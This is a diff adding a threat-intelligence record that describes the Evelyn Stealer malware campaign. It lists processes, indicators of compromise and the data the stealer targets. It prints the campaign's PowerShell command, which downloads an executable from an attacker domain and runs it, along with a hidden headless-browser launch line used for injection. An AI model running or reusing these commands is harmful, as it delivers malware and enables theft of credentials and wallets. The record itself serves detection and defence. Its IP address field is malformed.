@@ -1,0 +1,66 @@
+description: Evelyn Stealer attempts to inject into browsers and steal various data
+  including browser wallets, Telegram sessions, gaming sessions, Discord tokens, WiFi
+  passwords, FileZilla data, VPN configs, clipboard contents, sensitive files, system
+  info, process list, installed programs, and screenshots. It then compresses the
+  stolen data and uploads it via FTP.
+malware_families:
+- Evelyn Stealer
+TTPs:
+  processes:
+  - Lightshot.exe
+  - grpconv.exe
+  - powershell.exe
+  - cmd.exe
+  commandline:
+  - powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://syn1112223334445556667778889990.0rg/iknowyou.model -OutFile $env:TEMP\\runtime.exe; Start-Process $env:TEMP\\runtime.exe"
+  - '"grpconv.exe"'
+  - '"\"%s\\\" --headless=new --disable-gpu --no-sandbox --disable-extensions --disable-software-rasterizer
+    --disable-dev-shm-usage --disable-logging --silent-launch --no-first-run --no-default-browser-check
+    --disable-popup-blocking --disable-background-networking --disable-sync --disable-translate
+    --metrics-recording-only --mute-audio --hide-scrollbars --window-position=-10000,-10000
+    --window-size=1,1 about:blank\"'
+  powershell:
+  - Invoke-WebRequest -Uri http://syn1112223334445556667778889990.0rg/iknowyou.model
+    -OutFile $env:TEMP\\runtime.exe; Start-Process $env:TEMP\\runtime.exe
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - kernel32.dll
+  - ntdll.dll
+  - InjectDLL
+  network_connections:
+  - grpconv.exe, server09.mentality.cloud, 21
+  - server09.mentality.cloud, 21
+  - servere9.mentality.cloud
+  file_activity:
+  - '%TEMP%\\runtime.exe'
+  - '%APPDATA%\\Evelyn\\*'
+  - '%TEMP%\\abe_decrypt.dll'
+  - edge
+  - chrome
+  - brave
+  - Evelyn\\Wallets
+  - zip file
+  persistence: []
+  process_relations:
+  - Lightshot.exe->powershell.exe->runtime.exe
+  - runtime.exe->grpconv.exe
+IOCs:
+  hashes:
+  - 369479bd9a248c9448705c222d81ff1a0143343a138fc38fc0ea00f54fcc1598
+  - 92af258d13494f208ccf76f53a36f288060543f02ed438531e0675b85da00430
+  - aba7133f975a0788dd2728b4bbb1d7d948e50571a033a1e8f47a2691e98600c5
+  - 74e43a0175179a0a04361faaaaf05eb1e6b84adca69e4f446ef82c0a5d1923d5
+  ip_addresses:
+  - 192,168,104,18,234,106
+  domains:
+  - syn1112223334445556667778889990.0rg
+  - server09.mentality.cloud
+  - servere9.mentality.cloud
+  urls:
+  - http://syn1112223334445556667778889990.0rg/iknowyou.model
+authors:
+- Ahmed Mohamed Ibrahim
+reference: https://www.trendmicro.com/en_us/research/26/a/analysis-of-the-evelyn-stealer-campaign.html
+date_of_publication: January 19, 2026
+file_creation_date: January 19, 2026
